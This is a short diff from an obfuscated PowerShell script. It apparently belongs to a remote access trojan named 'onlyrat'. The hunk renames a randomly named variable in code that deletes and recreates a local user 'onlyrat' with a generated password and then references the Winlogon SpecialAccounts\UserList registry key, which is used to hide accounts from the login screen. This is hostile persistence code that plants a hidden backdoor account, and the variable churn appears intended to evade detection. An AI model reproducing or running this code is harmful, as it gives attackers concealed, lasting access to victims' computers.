@@ -48,8 +48,8 @@ function geIwCZloBx {
 $sqbXFdLvyw = "onlyrat"
 $DCilJFugpP = RpLGWiUsIy
 Remove-LocalUser -Name $sqbXFdLvyw
-$CBFXIYeWPR = (ConvertTo-SecureString $DCilJFugpP -AsPlainText -Force)
-geIwCZloBx -sqbXFdLvyw $sqbXFdLvyw -CBFXIYeWPR $CBFXIYeWPR
+$HcMjDkGFes = (ConvertTo-SecureString $DCilJFugpP -AsPlainText -Force)
+geIwCZloBx -sqbXFdLvyw $sqbXFdLvyw -CBFXIYeWPR $HcMjDkGFes
 
 # registry
 $csfMFzvgEN = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
